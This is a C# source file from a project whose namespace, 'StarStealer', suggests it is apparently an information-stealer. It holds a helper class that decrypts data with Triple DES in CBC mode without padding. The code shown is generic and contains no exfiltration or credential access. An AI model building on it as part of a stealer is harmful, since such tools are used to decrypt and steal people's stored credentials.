using System.IO;
using System.Security.Cryptography;

namespace StarStealer.Cryptography
{
	public class TripleDESHelper
	{
		public static string DESCBCDecryptor(byte[] key, byte[] iv, byte[] input)
		{
			string result = null;
			using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
			{
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.IV = iv;
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
				using (MemoryStream stream = new MemoryStream(input))
				{
					using (CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(stream2))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}

		public static byte[] DESCBCDecryptorByte(byte[] key, byte[] iv, byte[] input)
		{
			byte[] array = new byte[512];
			using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
			{
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.IV = iv;
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
				using (MemoryStream stream = new MemoryStream(input))
				{
					using (CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Read))
					{
						cryptoStream.Read(array, 0, array.Length);
					}
				}
			}
			return array;
		}
	}
}
